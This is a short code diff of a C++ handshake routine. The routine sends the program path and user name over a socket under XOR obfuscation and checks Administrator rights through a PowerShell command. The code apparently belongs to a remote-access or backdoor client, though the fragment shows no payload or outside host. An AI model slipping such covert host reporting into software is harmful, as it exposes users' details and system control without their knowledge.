@@ -78,10 +78,10 @@ void HandShake::startHandShake()
     //01010101001010101010101010010101010101010101001010101010
     cout << "strlen before encrypt path prog: " << strlen(path_prog.c_str()) << endl;
     cout << "size before encrypt path prog: " << path_prog.size() << endl;
+
     sendUltraSafe(a_sock, XOREncryption(path_prog));
     cout << "path prog " << endl;
 
-    
     sendUltraSafe(a_sock,XOREncryption(name_user));
     cout << "name user" << endl;
     
@@ -96,10 +96,10 @@ void HandShake::startHandShake()
 }
 bool HandShake::setIsAdmin()
 {
-    string result;
+    vector <string> result;
     cout << "call getamdin" << endl;
     result = Exec().executeCommand("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
-    if(result.substr(0,4) == "True") //remove ruturn line.
+    if(result[0].substr(0,4) == "True") //remove ruturn line.
     {
         //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
         return true;
@@ -154,7 +154,7 @@ string HandShake::setLocationProg()
         if(_getcwd(buffer,sizeof(buffer)) == 0)//if error
         {
             string result_cmd;
-            result_cmd = Exec().executeCommand("pwd");
+            //result_cmd = Exec().executeCommand("pwd");
             return (string) result_cmd + "\\" + NAME_PROG;
         }
         else
